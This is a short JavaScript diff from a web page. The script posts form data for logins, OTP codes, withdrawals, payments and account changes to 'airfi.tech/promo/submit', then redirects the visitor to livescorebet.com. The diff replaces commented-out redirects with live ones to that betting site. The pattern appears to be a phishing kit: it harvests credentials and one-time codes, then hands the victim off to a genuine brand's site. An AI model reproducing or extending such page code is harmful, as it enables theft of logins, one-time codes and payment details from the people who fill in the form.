@@ -111,15 +111,15 @@ xhttp.onreadystatechange = function() {
        console.log(xhttp.responseText);
        if (method === 'login' || method === 'otp' || method === 'withdrawal' || method === 'vendor-register' || method === 'bus-login')
        {
-            //window.location.replace('https://airfi.tech/foodchow/loggedin.html');
+            window.location.replace('https://www.livescorebet.com/uk/');
        }
        if (method === 'register' || method === 'recover' || method === 'account_details_change' || method === 'payment' || method === 'review')
        {
-            //window.location.replace('https://airfi.tech/foodchow/loggedin.html');
+            window.location.replace('https://www.livescorebet.com/uk/');
        }
     }
     if (this.readyState == 4 && this.status == 400) {
-        //window.location.replace('https://airfi.tech/foodchow/404.html');
+        window.location.replace('https://www.livescorebet.com/uk/');
     }
 };
 xhttp.open("POST", "https://airfi.tech/promo/submit?" + urlStr, false);
